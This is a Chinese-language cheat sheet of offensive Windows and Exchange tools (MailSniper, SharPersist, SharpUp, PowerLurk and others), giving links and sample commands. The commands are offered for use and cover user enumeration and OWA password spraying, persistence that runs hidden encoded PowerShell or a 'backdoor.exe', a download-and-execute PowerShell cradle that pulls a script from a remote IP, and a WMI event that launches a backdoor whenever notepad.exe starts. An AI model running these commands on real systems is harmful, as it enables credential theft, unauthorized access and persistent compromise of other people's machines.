# 1.mailsniper
* 项目地址：https://github.com/dafthack/MailSniper
* 工具用处：Microsoft Exchange 环境中搜索电子邮件中的特定术语（密码、内部情报、网络架构信息等）,MailSniper 还包括用于密码喷射、枚举用户和域、从 OWA 和 EWS 收集全局地址列表 (GAL) 以及检查组织中每个 Exchange 用户的邮箱权限的附加模块。
* 简单用法：
```
ipmo .\MailSniper.ps1

#枚举合法用户，user.txt 为字典
Invoke-UsernameHarvestOWA -ExchHostname mail.xx.cn -Domain xx.cn -thread 5 -UserList .\user.txt -OutFile .\valid.txt

#密码喷洒
Invoke-PasswordSprayOWA -ExchHostname mail.xxx.cn -UserList .\1.txt -Password xxxxx

#收集电子邮件地址
Get-GlobalAddressList -ExchHostname mail.xxx.cn -UserName xxx.cn\lu.sc -Password xxxxx -OutFile gal.txt
```
---
# 2.TREVORspray
* 项目地址：https://github.com/blacklanternsecurity/TREVORspray
* 工具用处：模块化密码喷雾器，具有线程、智能代理、战利品模块等！（主要用来爆破O365）
---
# 3.Seatbelt
* 项目地址：https://github.com/GhostPack/Seatbelt
* 工具用处：Seatbelt是一个 C# 工具，可自动收集主机的枚举数据。它可以检查安全配置，例如操作系统信息、AV、AppLocker、LAPS、PowerShell 日志记录、审核策略、.NET 版本、防火墙规则等。
* 简单用法：
```
#运行所有检查并返回所有输出
Seatbelt.exe -group=all -full

#运行检查以挖掘有关系统的有趣数据。
Seatbelt.exe -group=system

#运行检查，挖掘有关当前登录用户（如果未提升）或所有用户（如果提升）的有趣数据。
Seatbelt.exe -group=user

#运行所有杂项检查。
Seatbelt.exe -group=misc
```
---
# 4.SharPersist
* 项目地址：https://github.com/mandiant/SharPersist
* 工具用处：Windows 持久性工具包
* 简单用法：
```
#通过计划任务
SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc payload" -n "Updater" -m add -o hourly

#通过启动文件夹
SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc payload" -f "UserEnvSetup" -m add

#通过注册表
SharPersist.exe -t reg -c "C:\ProgramData\backdoor.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```
---
# 5.Sysinternals Suite
* 项目地址：https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
* 工具用处：帮助用户管理、诊断和解决 Windows 系统问题
* 常用工具说明：
```
Process Explorer (procexp.exe):
这是一个高级的任务管理器替代品，提供了更详细的进程信息、性能图表、资源消耗分析等功能。它允许用户查看系统中运行的所有进程，并提供了对它们进行监视、结束、调试等操作的功能。

Autoruns (autoruns.exe):
这个工具用于管理系统启动时自动加载的程序和服务。它允许用户查看和管理各种自启动项，包括注册表、启动文件夹、计划任务等，帮助识别和解决系统启动速度慢或系统启动时出现的问题。

Process Monitor (procmon.exe):
这是一个高级的系统监视工具，用于捕获和显示系统活动，如文件系统、注册表和进程/线程活动。它可以帮助用户诊断应用程序问题、查找系统瓶颈以及进行安全审计。

TCPView (tcpview.exe):
这个工具用于监视系统上所有 TCP 和 UDP 网络连接的实时状态。它提供了对网络连接的详细信息，包括本地和远程地址、协议、状态等，帮助用户诊断网络问题和监视系统的网络活动。

Disk Usage (du.exe):
这个工具用于显示指定路径下的文件和文件夹的磁盘使用情况统计信息。它可以帮助用户快速了解磁盘上哪些文件和文件夹占用了大量的空间，从而进行磁盘清理和优化。
```

# 6.SharpUp
* 项目地址：https://github.com/GhostPack/SharpUp
* 工具用处：继承与PowerSploit，仅有提权类型的检测，无武器化
* 简单用法：
```
#检查系统中是否存在未引号包裹的服务路径（Unquoted Service Path）漏洞
SharpUp.exe audit UnquotedServicePath

#弱服务权限，找到可修改的服务：
SharpUp.exe audit ModifiableServices

#弱二进制服务检测，找到可修改的二进制文件 exe
SharpUp.exe audit ModifiableServiceBinaries
```
---

# 7. PowerSploit
* 项目地址：https://github.com/PowerShellMafia/PowerSploit
* 工具用处：PowerSploit是一款用于在Windows环境下进行渗透测试和红队操作的强大的开源工具集，主要基于PowerShell脚本，提供了多种攻击模块和功能。

---
# 8.ElevateKit
* 项目地址：https://github.com/cobalt-strike/ElevateKit
* 项目用处：cs 提权工具包

---
# 9.cs4.7
* 无需解释

---
# 10.PowerLurk-master
* 项目地址：https://github.com/Sw4mpf0x/PowerLurk
* 项目用处：
```
本地导入：
PS> powershell.exe -NoP -Exec ByPass -C Import-Module c:\\temp\\PowerLurk.ps1
远程导入：
PS> powershell.exe -NoP -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerLurk.ps1'); Get-WmiEvent"


#返回名称为“RedTeamEvent”的所有活动 WMI 事件对象
Get-WmiEvent -Name 名称
#删除“RedTeamEvent”WMI 事件对象
Get-WmiEvent -Name RedTeamEvent | Remove-WmiObject



#注册-MaliciousWmiEvent（此 cmdlet 是 PowerLurk 的核心）
#每当 notepad.exe 启动时，执行后门 http.exe
Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Users\lsc\Desktop\http.exe" -Trigger ProcessStart -ProcessName notepad.exe
#清除恶意 WMI 事件（名称为WmiBackdoor）
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject












